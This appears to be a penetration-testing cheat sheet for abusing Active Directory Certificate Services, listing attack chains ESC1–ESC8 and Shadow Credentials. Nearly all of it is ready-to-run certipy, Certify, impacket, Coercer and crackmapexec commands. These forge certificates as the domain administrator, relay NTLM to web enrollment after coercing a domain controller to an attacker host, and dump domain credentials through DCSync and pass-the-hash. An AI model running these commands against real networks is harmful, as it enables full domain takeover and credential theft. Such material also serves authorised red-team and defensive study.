# ADCS Certificate Abuse — ESC1-8 Attack Chains

---

## Enumeration

```bash
# certipy (Linux)
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -stdout
certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -json -output adcs_output

# Certify (Windows)
.\Certify.exe find /vulnerable
.\Certify.exe cas              # enumerate CAs
.\Certify.exe templates        # all templates
```

Output shows: CA name, template name, ESC class, enrollment rights, vulnerable flags.

---

## ESC1 — Enrollee-Supplied SAN

Template allows enrollee to specify Subject Alternative Name → request cert as DA.

**Requirements**: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on template + enrollment permission.

```bash
# Request cert with DA UPN in SAN
certipy req -u user@domain.local -p pass -ca '<CA-Name>' -template '<template>' \
  -upn administrator@domain.local -dc-ip <dc_ip>

# Certify (Windows) + Rubeus
.\Certify.exe request /ca:<CA-Name> /template:<template> /altname:administrator
# Convert .pem to .pfx: openssl pkcs12 -in cert.pem -keyex -CSP "RSA" -export -out cert.pfx

# Authenticate with cert → get TGT
certipy auth -pfx administrator.pfx -domain domain.local -username administrator -dc-ip <dc_ip>
# Outputs: NTLM hash + TGT (.ccache)

# Use NTLM hash for pass-the-hash
impacket-secretsdump domain.local/administrator@<dc_ip> -hashes :NTLM
```

---

## ESC2 — Any Purpose / SubCA Template

Template has `Any Purpose` EKU or no EKU → can be used for anything including client auth.

```bash
# Same flow as ESC1 — request with -upn flag
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<esc2-template>' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC3 — Certificate Request Agent

Enroll in template with `Certificate Request Agent` EKU → use that cert to enroll on behalf of any user in another template.

```bash
# Step 1: Get agent certificate
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<ESC3-Agent-Template>'

# Step 2: Enroll on behalf of DA using agent cert
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -on-behalf-of domain\\administrator -pfx agent.pfx

# Authenticate
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC4 — Writable Template ACL

Current user has `WriteProperty`/`WriteDacl`/`GenericAll` on template → modify it to allow ESC1.

```bash
# Modify template to add ENROLLEE_SUPPLIES_SUBJECT flag
certipy template -u user@domain.local -p pass -template '<template>' -save-old
certipy template -u user@domain.local -p pass -template '<template>' \
  -configuration '<CA>\<template>' -target <dc_ip>

# Now request as ESC1
certipy req -u user@domain.local -p pass -ca '<CA>' -template '<template>' \
  -upn administrator@domain.local

# Restore original template
certipy template -u user@domain.local -p pass -template '<template>' -configuration old_template.json
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on CA

CA has this flag set → ANY template with client auth EKU allows enrollee-supplied SAN, even without the template flag.

```bash
# Check flag
certipy find ... | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Exploit: same as ESC1 — use any client auth template
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'User' \
  -upn administrator@domain.local
certipy auth -pfx administrator.pfx -domain domain.local -username administrator
```

---

## ESC7 — CA Manager / Officer Rights

User has `ManageCA` or `ManageCertificates` right → enable EDITF_ATTRIBUTESUBJECTALTNAME2 on CA (→ ESC6 chain).

```bash
# Enable flag
certipy ca -u user@domain.local -p pass -ca '<CA>' -enable-attribute-subjectaltname2 -target <dc_ip>

# Then exploit as ESC6
certipy req -u user@domain.local -p pass -ca '<CA>' -template 'SubCA' \
  -upn administrator@domain.local
```

---

## ESC8 — NTLM Relay to ADCS Web Enrollment

Relay NTLM auth to ADCS HTTP endpoint → obtain certificate for any relaying principal.

```bash
# Setup relay (see ntlm-relay.md)
impacket-ntlmrelayx -t http://<ADCS-host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC authentication
python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacker_ip>

# ntlmrelayx outputs DC certificate → save dc.pfx

# Authenticate with DC cert
certipy auth -pfx dc.pfx -domain domain.local -username '<dc_hostname>$' -dc-ip <dc_ip>

# DCSync using TGT
impacket-secretsdump -k -no-pass domain.local/'<dc_hostname>$'@<dc_ip>
```

---

## Shadow Credentials

Write `msDS-KeyCredentialLink` attribute to target → authenticate as target via PKINIT (no cert template needed, no CA needed).

**Requirements**: `GenericWrite`/`GenericAll` on target account.

```bash
# certipy shadow
certipy shadow auto -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# Outputs: NTLM hash of target_user

# Manual:
certipy shadow add -u user@domain.local -p pass -account <target_user> -dc-ip <dc_ip>
# → produces <target_user>.pfx
certipy auth -pfx <target_user>.pfx -domain domain.local -username <target_user> -dc-ip <dc_ip>
```

---

## Certificate authentication → credential extraction

```bash
# certipy auth → always produces both TGT and NTLM hash
certipy auth -pfx user.pfx -domain domain.local -username user -dc-ip <dc_ip>
# Output: user.ccache + NTLM hash printed

# Use TGT
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass domain.local/user@<target>

# Use NTLM hash
impacket-secretsdump domain.local/user@<dc_ip> -hashes :NTLM
crackmapexec smb <subnet>/24 -u user -H NTLM --local-auth
```
